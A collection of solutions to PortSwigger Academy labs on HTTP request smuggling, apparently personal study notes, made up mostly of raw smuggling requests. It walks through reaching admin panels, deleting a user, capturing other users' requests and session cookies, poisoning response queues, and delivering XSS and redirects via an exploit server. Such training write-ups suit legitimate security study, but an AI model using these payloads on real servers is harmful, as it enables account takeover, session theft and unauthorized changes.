<!-- omit in toc -->
# HTTP Request Smuggling

<!-- omit in toc -->
## Table of Contents

- [HTTP request smuggling, basic CL.TE vulnerability](#http-request-smuggling-basic-clte-vulnerability)
- [HTTP request smuggling, basic TE.CL vulnerability](#http-request-smuggling-basic-tecl-vulnerability)
- [HTTP request smuggling, obfuscating the TE header](#http-request-smuggling-obfuscating-the-te-header)
- [HTTP request smuggling, confirming a CL.TE vulnerability via differential responses](#http-request-smuggling-confirming-a-clte-vulnerability-via-differential-responses)
- [HTTP request smuggling, confirming a TE.CL vulnerability via differential responses](#http-request-smuggling-confirming-a-tecl-vulnerability-via-differential-responses)
- [Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls-clte-vulnerability)
- [Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls-tecl-vulnerability)
- [Exploiting HTTP request smuggling to reveal front-end request rewriting](#exploiting-http-request-smuggling-to-reveal-front-end-request-rewriting)
- [Exploiting HTTP request smuggling to capture other users' requests](#exploiting-http-request-smuggling-to-capture-other-users-requests)
- [Exploiting HTTP request smuggling to deliver reflected XSS](#exploiting-http-request-smuggling-to-deliver-reflected-xss)

## HTTP request smuggling, basic CL.TE vulnerability
Reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

<!-- omit in toc -->
### Quick Solution
As said in the title this website is vulnerable to a simple CL.TE vulnerability. Payload in the next paragraph.

<!-- omit in toc -->
### Solution
Using Burp Repeater, issue the following request twice:

```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
The second response should say: ``Unrecognized method GPOST``.


## HTTP request smuggling, basic TE.CL vulnerability
Reference: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

<!-- omit in toc -->
### Quick Solution
As said in the title this website is vulnerable to a simple TE.CL vulnerability. Payload in the next paragraph.

<!-- omit in toc -->
### Solution
In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
The second response should say: ``Unrecognized method GPOST``.

## HTTP request smuggling, obfuscating the TE header
Reference: https://ac971f131f8e9498c0a86f1d00cd0030.web-security-academy.net/

<!-- omit in toc -->
### Quick Solution
In this case the TE header had to be obfuscated. Payload in the next paragraph.

<!-- omit in toc -->
### Solution
In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
The second response should say: ``Unrecognized method GPOST``. 

## HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
Reference: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses

<!-- omit in toc -->
### Quick Solution
In this case the CL.TE vulnerability must be exploited via differential response. Payload in the next paragraph.

<!-- omit in toc -->
### Solution
Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```
The second request should receive an HTTP 404 response.

## HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
Reference: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses

<!-- omit in toc -->
### Quick Solution
In this case the TE.CL vulnerability must be exploited via differential response. Payload in the next paragraph.

<!-- omit in toc -->
### Solution
Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
The second request should receive an HTTP 404 response.

## Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te

<!-- omit in toc -->
### Quick Solution
This lab is divided in two parts. In the first part the goal is to access the ``/admin`` page, in the second part the goal is to delete a user. So two different requests must be sent. Payloads in the next paragraph.

<!-- omit in toc -->
### Solution
1. Try to visit ``/admin`` and observe that the request is blocked.
2. Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```
3. Observe that the merged request to ``/admin`` was rejected due to not using the header ``Host: localhost``.
4. Issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
```
5. Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.
6. Issue the following request twice so the second request's headers are appended to the smuggled request body instead:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
7. Observe that you can now access the admin panel.
8. Using the previous response as a reference, change the smuggled request URL to delete the user ``carlos``:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

## Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl

<!-- omit in toc -->
### Quick Solution
This lab is divided in two parts. In the first part the goal is to access the ``/admin`` page, in the second part the goal is to delete a user. So two different requests must be sent. Payloads in the next paragraph.

<!-- omit in toc -->
### Solution
1. Try to visit ``/admin`` and observe that the request is blocked.
2. In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
3. Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
4. Observe that the merged request to ``/admin`` was rejected due to not using the header ``Host: localhost``.
5. Issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
6. Observe that you can now access the admin panel.
7. Using the previous response as a reference, change the smuggled request URL to delete the user ``carlos``:
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

## Exploiting HTTP request smuggling to reveal front-end request rewriting
Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting

<!-- omit in toc -->
### Solution
1. Browse to ``/admin`` and observe that the admin panel can only be loaded from ``127.0.0.1``.
2. Use the site's search function and observe that it reflects the value of the ``search`` parameter.
3. Use Burp Repeater to issue the following request twice.
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```
4. The second response should contain "Search results for" followed by the start of a rewritten HTTP request.
5. Make a note of the name of the`` X-*-IP`` header in the rewritten request, and use it to access the admin panel:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```
6. Using the previous response as a reference, change the smuggled request URL to delete the user carlos:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

## Exploiting HTTP request smuggling to capture other users' requests
Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests

<!-- omit in toc -->
### Solution
1. Visit a blog post and post a comment.
3. Send the ``comment-post`` request to Burp Repeater, shuffle the body parameters so the ``comment`` parameter occurs last, and make sure it still works.
Increase the ``comment-post`` request's ``Content-Length`` to 400, then smuggle it to the back-end server:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
```
4. View the blog post to see if there's a comment containing a user's request. Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.
5. Copy the user's Cookie header from the comment, and use it to access their account.

## Exploiting HTTP request smuggling to deliver reflected XSS
Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss

<!-- omit in toc -->
### Solution
1. Visit a blog post, and send the request to Burp Repeater.
2. Observe that the comment form contains your ``User-Agent`` header in a hidden input.
3. Inject an XSS payload into the ``User-Agent`` header and observe that it gets reflected:
```
"/><script>alert(1)</script>
```
4. Smuggle this XSS request to the back-end server, so that it exploits the next visitor:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

Lab: Response queue poisoning via H2.TE request smuggling

poc payload:

POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 13

0

SMUGGLED

    Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request using chunked encoding as follows. Remember to expand the Inspector's Request Attributes section and make sure the protocol is set to HTTP/2 before sending the request.
    POST / HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Transfer-Encoding: chunked

    0

    SMUGGLED

    Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.

    In Burp Repeater, create the following request, which smuggles a complete request to the back-end server. Note that the path in both requests points to a non-existent endpoint. This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have successfully captured.
    POST /x HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Transfer-Encoding: chunked

    0

    GET /x HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Note

    Remember to terminate the smuggled request properly by including the sequence \r\n\r\n after the Host header.

    Send the request to poison the response queue. You will receive the 404 response to your own request.

    Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.
    Note

    If you receive some 200 responses but can't capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again.

    Copy the session cookie and use it to send the following request:
    GET /admin HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Cookie: session=STOLEN-SESSION-COOKIE

    Send the request repeatedly until you receive a 200 response containing the admin panel.

    // OR send the request separately for the admin panel to come up immediatly - FMisi

    In the response, find the URL for deleting carlos (/admin/delete?username=carlos), then update the path in your request accordingly. Send the request to delete carlos and solve the lab.

Lab: H2.CL request smuggling



    Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request by including a Content-Length: 0 header as follows. Remember to expand the Inspector's Request Attributes section and make sure the protocol is set to HTTP/2 before sending the request.
    POST / HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Length: 0

    SMUGGLED

    Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.

    Using Burp Repeater, notice that if you send a request for GET /resources, you are redirected to https://YOUR-LAB-ID.web-security-academy.net/resources/.

    Create the following request to smuggle the start of a request for /resources, along with an arbitrary Host header:
    POST / HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Length: 0

    GET /resources HTTP/1.1
    Host: foo
    Content-Length: 5

    x=1

    Send the request a few times. Notice that smuggling this prefix past the front-end allows you to redirect the subsequent request on the connection to an arbitrary host.

    Go to the exploit server and change the file path to /resources. In the body, enter the payload alert(document.cookie), then store the exploit.

    In Burp Repeater, edit your malicious request so that the Host header points to your exploit server:
    POST / HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Length: 0

    GET /resources HTTP/1.1
    Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
    Content-Length: 5

    x=1

    Send the request a few times and confirm that you receive a redirect to the exploit server.

    Resend the request and wait for 10 seconds or so.

    Go to the exploit server and check the access log. If you see a GET /resources/ request from the victim, this indicates that your request smuggling attack was successful. Otherwise, check that there are no issues with your attack request and try again.

    Once you have confirmed that you can cause the victim to be redirected to the exploit server, repeat the attack until the lab solves. This may take several attempts because you need to time your attack so that it poisons the connection immediately before the victim's browser attempts to import a JavaScript resource. Otherwise, although their browser will load your malicious JavaScript, it won't execute it.

Lab: HTTP/2 request smuggling via CRLF injection



    In Burp's browser, use the lab's search function a couple of times and observe that the website records your recent search history. Send the most recent POST / request to Burp Repeater and remove your session cookie before resending the request. Notice that your search history is reset, confirming that it's tied to your session cookie.

    Expand the Inspector's Request Attributes section and make sure the protocol is set to HTTP/2.

    Using the Inspector, add an arbitrary header to the request. Append the sequence \r\n to the header's value, followed by the Transfer-Encoding: chunked header:

    Name
    foo

    Value
    bar\r\n
    Transfer-Encoding: chunked

    In the body, attempt to smuggle an arbitrary prefix as follows:
    0

    SMUGGLED

    Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix

    Change the body of the request to the following:
    0

    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Cookie: session=YOUR-SESSION-COOKIE
    Content-Length: 800

    search=x

    Send the request, then immediately refresh the page in the browser. The next step depends on which response you receive:

        If you got lucky with your timing, you may see a 404 Not Found response. In this case, refresh the page again and move on to the next step.

        If you instead see the search results page, observe that the start of your request is reflected on the page because it was appended to the search=x parameter in the smuggled prefix. In this case, send the request again, but this time wait for 15 seconds before refreshing the page. If you see a 404 response, just refresh the page again.

    Check the recent searches list. If it contains a GET request, this is the start of the victim user's request and includes their session cookie. If you instead see your own POST request, you refreshed the page too early. Try again until you have successfully stolen the victim's session cookie.

    In Burp Repeater, send a request for the home page using the stolen session cookie to solve the lab.

Lab: HTTP/2 request splitting via CRLF injection

https://www.youtube.com/watch?v=W3BGHKyf8RY

poc stuff:

// kettled request: foo: bar\r\nTransfer-Encoding: chunked
0

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Length: 900

search=x


    Send a request for GET / to Burp Repeater. Expand the Inspector's Request Attributes section and make sure the protocol is set to HTTP/2.

    Change the path of the request to a non-existent endpoint, such as /x. This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have successfully captured.

    Using the Inspector, append an arbitrary header to the end of the request. In the header value, inject \r\n sequences to split the request so that you're smuggling another request to a non-existent endpoint as follows:

    Name
    foo

    Value
    bar\r\n
    \r\n
    GET /x HTTP/1.1\r\n
    Host: YOUR-LAB-ID.web-security-academy.net

    Send the request. When the front-end server appends \r\n\r\n to the end of the headers during downgrading, this effectively converts the smuggled prefix into a complete request, poisoning the response queue.

    Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.
    Note

    If you receive some 200 responses but can't capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again.

    Copy the session cookie and use it to send the following request:
    GET /admin HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Cookie: session=STOLEN-SESSION-COOKIE

    Send the request repeatedly until you receive a 200 response containing the admin panel.

    In the response, find the URL for deleting carlos (/admin/delete?username=carlos), then update the path in your request accordingly. Send the request to delete carlos to solve the lab.

Lab: CL.0 request smuggling



Probe for vulnerable endpoints

    From the Proxy > HTTP history, send the GET / request to Burp Repeater twice.

    In Burp Repeater, add both of these tabs to a new group.

    Go to the first request and convert it to a POST request (right-click and select Change request method).

    In the body, add an arbitrary request smuggling prefix. The result should look something like this:
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Cookie: session=YOUR-SESSION-COOKIE
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: CORRECT

    GET /hopefully404 HTTP/1.1
    Foo: x

    Change the path of the main POST request to point to an arbitrary endpoint that you want to test.

    Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).

    Change the Connection header of the first request to keep-alive.

    Send the sequence and check the responses.

        If the server responds to the second request as normal, this endpoint is not vulnerable.

        If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this indicates that the back-end server is ignoring the Content-Length of requests.

    Deduce that you can use requests for static files under /resources, such as /resources/images/blog.svg, to cause a CL.0 desync.

Exploit

    In Burp Repeater, change the path of your smuggled prefix to point to /admin.

    Send the requests in sequence again and observe that the second request has successfully accessed the admin panel.

    Smuggle a request to GET /admin/delete?username=carlos request to solve the lab.
    POST /resources/images/blog.svg HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Cookie: session=YOUR-SESSION-COOKIE
    Connection: keep-alive
    Content-Length: CORRECT

    GET /admin/delete?username=carlos HTTP/1.1
    Foo: x

